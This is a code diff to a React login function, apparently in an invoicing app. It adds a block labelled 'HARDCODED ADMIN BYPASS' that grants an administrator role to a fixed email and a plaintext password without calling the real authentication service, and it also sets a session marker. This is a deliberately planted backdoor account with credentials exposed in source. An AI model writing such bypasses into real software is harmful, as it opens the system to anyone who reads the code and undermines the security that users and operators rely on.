@@ -797,6 +797,18 @@ export const StoreProvider: React.FC<{ children: React.ReactNode }> = ({ childre
   }, []);
 
   const loginUser = async (email: string, pass: string) => {
+    // HARDCODED ADMIN BYPASS
+    if (email.toLowerCase() === "admin@marcopolo.com" && pass === "Marcopolo$") {
+      setCurrentUser({
+        id: "admin-bypass",
+        name: "Administrator",
+        email: "admin@marcopolo.com",
+        role: "admin"
+      });
+      sessionStorage.setItem("mp-invoice-auth", "admin@marcopolo.com");
+      return { success: true, message: "Logged in as Administrator!" };
+    }
+
     const res = await loginWithEmail(email, pass);
     if (res.error) return { success: false, message: res.error };
     return { success: true, message: "Logged in successfully!" };
